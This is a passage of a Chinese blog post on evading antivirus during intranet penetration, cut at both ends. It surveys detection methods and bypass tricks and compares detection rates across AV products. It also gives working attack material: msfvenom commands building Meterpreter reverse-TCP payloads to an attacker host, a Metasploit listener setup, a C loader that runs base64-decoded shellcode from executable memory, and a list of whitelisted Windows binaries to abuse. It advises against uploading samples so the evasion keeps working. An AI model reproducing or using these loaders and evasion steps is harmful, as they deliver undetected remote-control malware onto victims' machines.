class=\"string\">&quot;C&quot;</span> &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">base64_encode</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *indata, <span class=\"type\">int</span> inlen, <span class=\"type\">char</span> *outdata, <span class=\"type\">int</span> *outlen)</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">base64_decode</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *indata, <span class=\"type\">int</span> inlen, <span class=\"type\">char</span> *outdata)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> __cplusplus</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">/* base64_h */</span></span></span><br></pre></td></tr></table></figure>\n\n<p><code>shellcode.c</code>文件内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;base64.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> buf[] =</span><br><span class=\"line\"><span class=\"string\">&quot;msf base64 code&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> * argv[])</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> str3[<span class=\"number\">1000</span>] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 原po代码报错，这里做了一些强制转换和类型修正</span></span><br><span class=\"line\">    base64_decode(buf, (<span class=\"type\">int</span>)<span class=\"built_in\">strlen</span>(buf), str3);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> *Memory;</span><br><span class=\"line\"></span><br><span class=\"line\">    Memory = VirtualAlloc(<span class=\"literal\">NULL</span>, <span class=\"keyword\">sizeof</span>(str3), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(Memory, str3, <span class=\"keyword\">sizeof</span>(str3));</span><br><span class=\"line\"></span><br><span class=\"line\">    ((<span class=\"type\">void</span>(*)())Memory)();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>使用msf生成base64编码的shellcode：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.174.128 lport=6666  -f c &gt; shell.c</span><br></pre></td></tr></table></figure>\n\n<p>把<code>shell.c</code>的内容复制到上面<code>shellcode.c</code>文件中。vs2019编译，关闭杀软，msf可成功上线。</p>\n<p>打开杀软，火绒可以查杀，<strong>360不能查杀</strong>。</p>\n<p>virustotal.com上查杀率为17&#x2F;67（原po为28&#x2F;69）。</p>\n<p><img src=\"/./images/202205301558330.png\" alt=\"image-20220530155809229\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>与2020年相比，2022年卷了很多。纵览360和火绒就能直观感受到，确实杀软能力越来越强了。2020年可以Bypass卡巴斯基、McAfee、Symantec等杀软的方法，2022年均失效。</p>\n<p>免杀操作层出不穷，特别是近两年也有很多新的优秀项目。本文仅为最基本的免杀方式，前路漫漫，还有很多要学习的，共勉。</p>\n<p>一些知识点：</p>\n<ul>\n<li>常见免杀工具（21种）：msf自免杀、Veil、Venom、Shellter、BackDoor-Factory、Avet、TheFatRat、Avoidz、Green-Hat-Suite、zirikatu、AVIator、DKMC、Unicorn、Python-Rootkit、DKMC、Unicorn、Python-Rootkit、ASWCrypter、nps_payload、GreatSCT、HERCULES、SpookFlare、SharpShooter、CACTUSTORCH、Winpayload等。</li>\n<li>常见免杀编程语言：C&#x2F;C++、C#、python、powershell、ruby、go等。</li>\n<li>常见免杀白名单程序（113个）：Rundll32.exe、Msiexec.exe、MSBuild.exe、InstallUtil.exe、Mshta.exe、Regsvr32.exe、Cmstp.exe、CScript.exe、WScript.exe、Forfiles.exe、te.exe、Odbcconf.exe、InfDefaultInstall.exe、Diskshadow.exe、PsExec.exe、Msdeploy.exe、Winword.exe、Regasm.exe、Regsvcs.exe、Ftp.exe、pubprn.vbs、winrm.vbs、slmgr.vbs、Xwizard.exe、Compiler.exe、IEExec.exe、MavInject32、Presentationhost.exe、Wmic.exe、Pcalua.exe、Url.dll、zipfldr.dll、Syncappvpublishingserver.vbs等。</li>\n</ul>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li>BypassAntiVirus：远控免杀系列文章 <a href=\"https://github.com/TideSec/BypassAntiVirus\">https://github.com/TideSec/BypassAntiVirus</a></li>\n<li>AntivirusScanner：杀软进程检测脚本 <a href=\"https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/AntivirusScanner\">https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/AntivirusScanner</a><br></style></li>\n</ul>\n","cover_type":"img","excerpt":"","more":"<h1 id=\"内网渗透-免杀\"><a href=\"#内网渗透-免杀\" class=\"headerlink\" title=\"内网渗透-免杀\"></a>内网渗透-免杀</h1><h2 id=\"杀软原理\"><a href=\"#杀软原理\" class=\"headerlink\" title=\"杀软原理\"></a>杀软原理</h2><p>可执行文件存在的两种状态及检测方式：</p>\n<ul>\n<li>未执行时在硬盘上的状态（静态检测）</li>\n<li>执行后加载进内存的状态（动态监测）</li>\n</ul>\n<p>杀软的基本等级：</p>\n<ul>\n<li>无害：无任何可疑行为，无任何特征命中病毒特征</li>\n<li>可疑：存在可疑行为，例如操作注册表、打开Powershell、修改用户、操作敏感文件等</li>\n<li>有害：特征命中病毒特征</li>\n</ul>\n<h3 id=\"静态检测\"><a href=\"#静态检测\" class=\"headerlink\" title=\"静态检测\"></a>静态检测</h3><p>静态检测是在不实际运行程序的情况下进行的分析，大部分的静态检测对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。</p>\n<p>静态检测针对样本文件在硬盘上的状态进行检测：</p>\n<ul>\n<li>样本Hash检测：此类检测会对文件整体以及各个节段进行Hash计算，而后对比是否存在于特征病毒库中，这是最早期的检测方法。对于Hash检测，在源码中修改一下变量名，或在编译完成之后，通过二进制查看器修改某一不重要的字节码，即可改变整个文件的Hash。</li>\n<li>特征码检测：由于样本Hash检测的缺点，特征码会提取文件中部分关键字节码作为特征进行检测，字节码可以是硬编码的IP、域名、互斥体名称、加密秘钥或部分关键流程代码。杀软会扫描存在磁盘上的镜像文件，如果满足特征码，就识别为恶意软件。</li>\n<li>黑白名单检测：对于一些系统进程或是杀软进程可能会默认加白，这样即便有些恶意行为，也不会被查杀。</li>\n</ul>\n<p>通常静态检测会识别代码中存在的函数：</p>\n<ul>\n<li>Windows API函数：尤其是与内存、堆、线程相关的函数，例如virualalloc、rtlmovememory、ntcreatthread等。</li>\n<li>编程语言关键词：cmd等关键词，例如Python中的subprocess.popen(“cmd &#x2F;c”)</li>\n</ul>\n<p>常见的绕过思路：</p>\n<ul>\n<li>绕过静态检测的方式通常有多次加密、内存加载执行、加壳改壳、添加&#x2F;替换资源、加密Shellcode等</li>\n</ul>\n<p>常用的静态检测平台：</p>\n<ul>\n<li><a href=\"https://www.virustotal.com/%EF%BC%8C%E6%B3%A8%E6%84%8F%EF%BC%9AVirustotal%E6%98%AF%E5%9B%BD%E5%A4%96%E5%B9%B3%E5%8F%B0%EF%BC%8C%E8%AF%B7%E8%B0%A8%E6%85%8E%E6%93%8D%E4%BD%9C%EF%BC%8C%E6%9C%80%E5%A5%BD%E4%B8%8D%E8%A6%81%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%EF%BC%8C%E5%BB%BA%E8%AE%AE%E4%BB%85%E6%A0%A1%E9%AA%8C%E5%B9%B6%E6%A3%80%E6%9F%A5MD5%E6%98%AF%E5%90%A6%E4%B8%BA%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E3%80%82\">https://www.virustotal.com/，注意：Virustotal是国外平台，请谨慎操作，最好不要直接上传文件，建议仅校验并检查MD5是否为恶意文件。</a></li>\n</ul>\n<h3 id=\"动态检测\"><a href=\"#动态检测\" class=\"headerlink\" title=\"动态检测\"></a>动态检测</h3><p>动态检测针对样本文件内存中的状态进行检测：</p>\n<ul>\n<li>内存特征码检测：对于静态文件特征码来说，可以将shellcode做多次加密，完全抹掉其原本特征，降低杀软的报毒率。但是当进入内存需要执行代码时，shellcode需要完全解密，这时候杀软只需要遍历内存，根据特征码进行查杀即可。</li>\n<li>敏感API检测（HOOK）：在关键的入口或道路进行监控，如果单次或多次触发警告，比如读取并修改了其他进程的内存，或在其他进程中开了个远程线程将触发告警。对于不同杀软的不同策略，将根据调用顺序、调用源、参数判断是否是正常调用。</li>\n<li>敏感行为检测：实现一个功能，不一定非要用某一个固定的接口，因此，实现一个读写内存操作，单检测一个API是无效的。此时，只要对象触发了某种行为，在其他进程中开了线程，那么就判定为恶意行为。常见的病毒恶意行为：<ul>\n<li>注册表操作：添加启动项、添加服务。</li>\n<li>文件操作：写入文件、读取系统文件、删除文件、移动文件。</li>\n<li>进程操作：杀死进程、创建进程。</li>\n<li>用户操作：添加用户、删除用户、删除用户。</li>\n<li>其他操作：注入、劫持等。</li>\n</ul>\n</li>\n</ul>\n<p>常见的绕过思路：</p>\n<ul>\n<li>绕过动态检测的方式通常是白名单调用敏感行为，再导入恶意内容</li>\n</ul>\n<p>常用的动态检测平台：</p>\n<ul>\n<li><a href=\"https://s.threatbook.cn/\">https://s.threatbook.cn/</a></li>\n</ul>\n<h3 id=\"流量检测\"><a href=\"#流量检测\" class=\"headerlink\" title=\"流量检测\"></a>流量检测</h3><p>流量检测针对恶意程序在网络通讯流量层面上的状态进行检测：</p>\n<ul>\n<li>结构特征：此类特征一般是指已知远控的恶意程序心跳包，比如CS beacon心跳包特征，会按照攻击者设置的频率发送固定结构固定内容的数据包以证明存活。</li>\n<li>内容特征：此类特征一般是指各类漏洞的exp流量包特征、冰蝎、哥斯拉等流量特征，对于此类流量可以编写流量规则进行过滤检测，比如suricata规则、wireshark规则等。</li>\n<li>IP&#x2F;域名&#x2F;证书匹配：对于数据包中的ip域名等信息，链接威胁情报平台查询是否存在恶意行为，比如扫描、用作C2回连或网站挂马等，对于此类流量可以选择弹窗告警或直接阻断。</li>\n</ul>\n<p>常见的绕过思路：</p>\n<ul>\n<li>绕过流量检测的方式通常有TCP分段传输、内容加密、使用合法证书等</li>\n</ul>\n<h3 id=\"云查杀\"><a href=\"#云查杀\" class=\"headerlink\" title=\"云查杀\"></a>云查杀</h3><p>云查杀的不同点在于它的病毒库是放在服务器端的，而不是本地客户端，只要联网，病毒库就会同步更新，病毒库更加强大。</p>\n<p>当开着杀软的云查杀的时候，有时候刚开始没报病毒，但过一会就提示病毒了。</p>\n<h2 id=\"免杀原理\"><a href=\"#免杀原理\" class=\"headerlink\" title=\"免杀原理\"></a>免杀原理</h2><h3 id=\"静态免杀\"><a href=\"#静态免杀\" class=\"headerlink\" title=\"静态免杀\"></a>静态免杀</h3><h4 id=\"修改特征码\"><a href=\"#修改特征码\" class=\"headerlink\" title=\"修改特征码\"></a>修改特征码</h4><p>特征码是能够识别一个程序的不大于64字节的字符。</p>\n<p>修改特征码是在不改变程序运行效果的前提下，更改其特征码。</p>\n<p>修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，但有时候在没有源码的情况下可以一用。</p>\n<h4 id=\"花指令免杀\"><a href=\"#花指令免杀\" class=\"headerlink\" title=\"花指令免杀\"></a>花指令免杀</h4><p>花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。</p>\n<p>为一个程序添加一段花指令之后，程序的部分偏移会受到影响，如果反病毒软件不能识别这段花指令，那么它检测特征码的偏移量会整体位移一段位置，也就无法正常检测木马了。</p>\n<h4 id=\"加壳免杀\"><a href=\"#加壳免杀\" class=\"headerlink\" title=\"加壳免杀\"></a>加壳免杀</h4><p>软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。</p>\n<p>加壳能够掩盖特征码，特别是对于不开源的PE文件，加壳可以绕过很多特征码识别。但是壳也有自己的特征，主流的壳例如VMP、Themida等，被检测出将直接报毒。</p>\n<p>可以用一些冷门的加密壳，或基于开源压缩壳做二次开发。</p>\n<p>加壳工具：</p>\n<ul>\n<li>ASPack</li>\n<li>UPX</li>\n</ul>\n<h3 id=\"动态免杀\"><a href=\"#动态免杀\" class=\"headerlink\" title=\"动态免杀\"></a>动态免杀</h3><h4 id=\"API免杀\"><a href=\"#API免杀\" class=\"headerlink\" title=\"API免杀\"></a>API免杀</h4><ul>\n<li><p>替换API：杀软不可能拦截所有API，可以使用相同功能的API进行替换，例如<code>MoveFileEx</code>替换<code>MoveFile</code>。</p>\n</li>\n<li><p>重写API：逆向后完全重写系统API功能，实现对应功能的API。</p>\n</li>\n<li><p>底层API：寻找更底层的API进行调用，绕过拦截，例如NT函数。或者通过DeviceloControl函数调用驱动功能来完成API功能，模拟系统调用。</p>\n</li>\n</ul>\n<h4 id=\"内存免杀\"><a href=\"#内存免杀\" class=\"headerlink\" title=\"内存免杀\"></a>内存免杀</h4><p>在执行外壳代码时，要先将原软件解密，并放到内存里，然后再通知CPU执行。加壳时，需要加一个混淆程序原有代码的壳，才能躲过杀软查杀。</p>\n<h4 id=\"二次编译\"><a href=\"#二次编译\" class=\"headerlink\" title=\"二次编译\"></a>二次编译</h4><p>Metasploit的Msfvenom提供了多种格式的Payload和Encoder，生成的Shellcode也为二次加工提供了很大便利。</p>\n<p>Shikata_ga_nai是MSF中唯一的评价是excellent的编码器，这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样的，还可以利用管道进行多重编码进行免杀。</p>\n<p>目前Msfvenom的Encoder特征基本都进入了杀软的漏洞库，很难实现单一Encoder编码而绕过杀软，所以对Shellcode进行进一步修改编译成了MSF免杀的主流。有很多借助于C、C#、python等语言对Shellcode进行二次编码从而达到免杀的效果。</p>\n<h4 id=\"分离免杀\"><a href=\"#分离免杀\" class=\"headerlink\" title=\"分离免杀\"></a>分离免杀</h4><p>例如Payload分离免杀和Webshell分离免杀，将Shellcode和加载器分离，实现简单，但效果不错。</p>\n<h4 id=\"资源修改\"><a href=\"#资源修改\" class=\"headerlink\" title=\"资源修改\"></a>资源修改</h4><p>有些杀软会设置有扫描白名单，比如之前把程序图标替换为360安全卫士图标就能过360的查杀。</p>\n<ul>\n<li>添加资源：使用ResHacker将正常软件的资源加入到恶意软件，例如图片、版本信息、对话框等</li>\n<li>替换资源：使用ResHacker替换无用的资源，例如版本等</li>\n<li>添加签名：使用签名伪造工具，将正常软件的签名信息添加到恶意软件</li>\n</ul>\n<h1 id=\"免杀技术研究\"><a href=\"#免杀技术研究\" class=\"headerlink\" title=\"免杀技术研究\"></a>免杀技术研究</h1><h2 id=\"Bypass一览表（2020年）\"><a href=\"#Bypass一览表（2020年）\" class=\"headerlink\" title=\"Bypass一览表（2020年）\"></a>Bypass一览表（2020年）</h2><p><img src=\"/./images/202205261702163.png\"></p>\n<p><img src=\"/./images/202205261701678.png\"></p>\n<h2 id=\"Bypass一览表（2022年）\"><a href=\"#Bypass一览表（2022年）\" class=\"headerlink\" title=\"Bypass一览表（2022年）\"></a>Bypass一览表（2022年）</h2><p>VirusTotal对应杀软及名称：</p>\n<ul>\n<li>卡巴：Kaspersky</li>\n<li>微软：Microsoft</li>\n<li>瑞星：Rising</li>\n<li>金山：Kingsoft</li>\n<li>江民：Jiangmin</li>\n<li>趋势：TrendMicro</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>序号</th>\n<th>免杀方法</th>\n<th>2020年VT</th>\n<th>2022年VT</th>\n<th>360</th>\n<th>QQ</th>\n<th>火绒</th>\n<th>卡巴</th>\n<th>McAfee</th>\n<th>微软</th>\n<th>Symantec</th>\n<th>瑞星</th>\n<th>金山</th>\n<th>江民</th>\n<th>趋势</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>未免杀处理</td>\n<td>53&#x2F;69</td>\n<td>51&#x2F;69</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>msf自编码</td>\n<td>51&#x2F;69</td>\n<td>48&#x2F;67</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>msf自捆绑</td>\n<td>39&#x2F;69</td>\n<td>15&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>4</td>\n<td>msf捆绑+编码</td>\n<td>35&#x2F;68</td>\n<td>16&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>5</td>\n<td>msf多重编码</td>\n<td>45&#x2F;70</td>\n<td>28&#x2F;67</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>6</td>\n<td>Evasion模块exe</td>\n<td>42&#x2F;71</td>\n<td>43&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>7</td>\n<td>Evasion模块hta</td>\n<td>14&#x2F;59</td>\n<td>（None）</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>8</td>\n<td>Evasion模块csc</td>\n<td>12&#x2F;71</td>\n<td>33&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>9</td>\n<td>Veil原生exe</td>\n<td>44&#x2F;71</td>\n<td>44&#x2F;69</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>10</td>\n<td>Veil+gcc编译</td>\n<td>23&#x2F;71</td>\n<td>11&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>11</td>\n<td>Venom生成exe</td>\n<td>19&#x2F;71</td>\n<td>35&#x2F;68</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>12</td>\n<td>Venom生成dll</td>\n<td>11&#x2F;71</td>\n<td>（None）</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>13</td>\n<td>Shellter生成exe</td>\n<td>7&#x2F;69</td>\n<td>12&#x2F;65</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>14</td>\n<td>msf生成exe</td>\n<td>-</td>\n<td>51&#x2F;69</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td></td>\n</tr>\n<tr>\n<td>15</td>\n<td>C&#x2F;C++2：动态内存</td>\n<td>24&#x2F;71</td>\n<td>36&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>16</td>\n<td>C&#x2F;C++3：嵌入汇编</td>\n<td>12&#x2F;71</td>\n<td>36&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>17</td>\n<td>C&#x2F;C++4：强制转换</td>\n<td>9&#x2F;70</td>\n<td>34&#x2F;68</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>18</td>\n<td>C&#x2F;C++5：汇编花指令</td>\n<td>12&#x2F;69</td>\n<td>37&#x2F;69</td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>19</td>\n<td>C&#x2F;C++6：XOR加密</td>\n<td>15&#x2F;71</td>\n<td>21&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>20</td>\n<td>C&#x2F;C++7：base64加密1</td>\n<td>28&#x2F;69</td>\n<td>21&#x2F;68</td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>21</td>\n<td>C&#x2F;C++8：base64加密2</td>\n<td>28&#x2F;69</td>\n<td>17&#x2F;67</td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n</tbody></table>\n<h2 id=\"复现环境（2022年）\"><a href=\"#复现环境（2022年）\" class=\"headerlink\" title=\"复现环境（2022年）\"></a>复现环境（2022年）</h2><p>时间：2022.05</p>\n<p>攻击机：192.168.174.128</p>\n<p>免杀方法：</p>\n<ul>\n<li>此处仅介绍msf、Evasion、Veil、Venom、C&#x2F;C++ Shellcode，其余方法参见原po：<a href=\"https://github.com/TideSec/BypassAntiVirus\">https://github.com/TideSec/BypassAntiVirus</a></li>\n</ul>\n<p>原po各杀软版本：</p>\n<ul>\n<li>360杀毒版本5.0.0.8160(2019.12.12)</li>\n<li>火绒版本5.0.33.13(2019.12.12)</li>\n<li>360安全卫士12.0.0.2001(2019.12.17)</li>\n</ul>\n<p>本文各杀软版本：</p>\n<ul>\n<li>火绒版本5.0.68.2(2022.05.26)</li>\n<li>360安全卫士13.0.0.2003(2022.05.26)</li>\n</ul>\n<p>测试平台：</p>\n<ul>\n<li>Virustotal，以下简称VT。VT查杀率代表静态查杀能力。</li>\n</ul>\n<p>【注意】</p>\n<ul>\n<li><p>如果是自己做免杀，建议测试机不要连互联网，更不要上传到virustotal.com类似的平台上。</p>\n</li>\n<li><p>不要上传！</p>\n</li>\n<li><p>不要上传！</p>\n</li>\n<li><p>不要上传！</p>\n</li>\n<li><p>上传一次以后，你自己辛辛苦苦写的免杀可能就不再免杀了。</p>\n</li>\n</ul>\n<h2 id=\"Metasploit自带免杀\"><a href=\"#Metasploit自带免杀\" class=\"headerlink\" title=\"Metasploit自带免杀\"></a>Metasploit自带免杀</h2><p>Payload均使用MSF的windows&#x2F;meterperter&#x2F;reverse_tcp模块生成。</p>\n<p>攻击机MSF监听6666端口：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use exploits/multi/handler</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set LHOST 192.168.174.128</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set LPORT 6666</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"原生态payload-VT查杀率51-69\"><a href=\"#原生态payload-VT查杀率51-69\" class=\"headerlink\" title=\"原生态payload(VT查杀率51&#x2F;69)\"></a>原生态payload(VT查杀率51&#x2F;69)</h3><p>MSF生成原始payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -f exe -o /mnt/hgfs/Share/payload1.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205261904148.png\" alt=\"image-20220526190423066\"></p>\n<p>360和火绒都能查杀。</p>\n<p>在virustotal.com上查杀率为51&#x2F;69（原po为53&#x2F;69）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205261901055.png\" alt=\"image-20220526190107987\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205261905876.png\" alt=\"image-20220526190513816\"></p>\n<p>VT查杀成功：</p>\n<p><img src=\"/./images/202205261909679.png\" alt=\"image-20220526190921570\"></p>\n<p>VT查杀失败：</p>\n<p><img src=\"/./images/202205261909529.png\" alt=\"image-20220526190959477\"></p>\n<h3 id=\"msf自编码免杀-VT查杀率48-67\"><a href=\"#msf自编码免杀-VT查杀率48-67\" class=\"headerlink\" title=\"msf自编码免杀(VT查杀率48&#x2F;67)\"></a>msf自编码免杀(VT查杀率48&#x2F;67)</h3><p>使用<code>msfvenom --list encoders</code>可查看所有编码器。</p>\n<p>评级最高的两个encoder为cmd&#x2F;powershell_base64和x86&#x2F;shikata_ga_nai，其中x86&#x2F;shikata_ga_nai也是免杀中使用频率最高的一个编码器。</p>\n<p>使用<code>x86/shikata_ga_nai</code>生成payload，参数<code>-i</code>为编码次数，使用<code>-b</code>参数去掉payload中的空字符：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -b &quot;\\x00&quot; -i 15  -f exe -o /mnt/hgfs/Share/payload2.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205261913186.png\" 